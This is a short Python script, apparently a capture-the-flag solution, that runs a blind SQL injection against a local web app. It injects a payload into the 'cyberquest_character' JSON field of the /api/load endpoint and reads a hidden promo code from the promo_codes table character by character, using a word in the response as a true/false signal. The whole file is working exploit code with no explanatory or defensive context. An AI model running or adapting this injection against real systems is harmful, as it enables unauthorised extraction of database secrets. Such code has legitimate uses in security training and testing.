import requests
import string

URL = "http://localhost:1337"

S = requests.Session();

for i in range(1,33):
    for c in string.hexdigits:
        R = S.post("%s/api/load" % URL,json={"cyberquest_character":"' OR '%s' = (SELECT substr(code,%d,1) FROM promo_codes) OR '2'='1" % (c,i),"debug":"false"})
        if "implemented" in R.text:
            print(c,end="")
            break
